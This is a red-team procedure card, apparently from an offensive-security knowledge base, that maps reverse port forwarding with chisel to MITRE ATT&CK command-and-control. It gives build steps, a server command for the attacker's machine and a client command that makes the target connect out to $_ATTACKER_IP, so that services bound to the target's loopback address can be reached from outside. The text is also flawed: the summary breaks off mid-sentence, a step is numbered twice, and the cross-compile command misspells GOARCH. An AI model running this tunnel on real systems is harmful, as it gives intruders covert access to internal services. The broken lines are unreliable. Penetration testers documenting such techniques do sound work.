---
id: 481cc231-b4d7-4e78-bfe9-8dce898f0a19
name: Remote Port Forwarding Over HTTP Proxy
type: procedure
verified: true
submitted: true
created_at: '2019-11-22T19:31:39.653115+00:00'
updated_at: '2023-07-15T01:44:23.273814+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
techniques:
- '[[Connection Proxy|T1090 - Connection Proxy]]'
platforms:
- Linux
- Windows
tags:
- '[[data encryption]]'
- '[[Network]]'
commands:
- '[[./chisel client $_ATTACKER_IP:$_ATTACKER_PORT R:$_]]'
- '[[Chisel Deploy a Reverse Port Forwarding Client (Target)]]'
- '[[Chisel Deploy a Reverse Port Forwarding Server]]'
---

# Remote Port Forwarding Over HTTP Proxy

**Status**: ✓ Verified

## Summary

Remote port forwarding is a technique which allows a system to forward the traffic of a local port to a remote system, allowing the remote system to connect as if it was a local connection. Often this is done when a service listens only the loopback address (127.0.0.1), and by forwarding it to a re

## Description

# Description

Remote port forwarding is a technique which allows a system to forward the traffic of a local port to a remote system, allowing the remote system to connect as if it was a local connection. Often this is done when a service listens only the loopback address (127.0.0.1), and by forwarding it to a remote host, attackers can access the service from a remote system the loopback restriction.

# Instructions

1. Clone the chisel repository

**Code**: [[git clone https://github.com/jpillora/chisel.git]]

2. Enter the chisel directory, then build the software

**Code**: [[cd chisel && go build]]

3. (Optional) Use the "GOOS" and "GOARCH" variables if building chisel for other platforms. A full list of available OS and ARCH can be found [here](https://golang.org/doc/install/source).

**Code**: [[GOOS=windows GOOARCH=amd64 go build]]

4. 4. Launch the chisel server on the attacker's machine

**Command** ([[Chisel Deploy a Reverse Port Forwarding Server]]):

```bash
chisel server -p $_LISTEN_PORT --reverse
```

5. Launch the chisel client on the target machine

**Command** ([[./chisel client $_ATTACKER_IP:$_ATTACKER_PORT R:$_]]):

```bash
./chisel client $_ATTACKER_IP:$_ATTACKER_PORT R:$_DESTINATION_PORT:$_SOURCE_PORT
```

Once connected, connections made on the local machine to the forwarded port will be sent over the HTTP proxy to the target host.

## Platforms

- Linux
- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]

### Techniques

- [[Connection Proxy|T1090 - Connection Proxy]]

## Commands Used

- [[./chisel client $_ATTACKER_IP:$_ATTACKER_PORT R:$_]]
- [[Chisel Deploy a Reverse Port Forwarding Client (Target)]]
- [[Chisel Deploy a Reverse Port Forwarding Server]]

## Tags

- [[data encryption]]
- [[Network]]
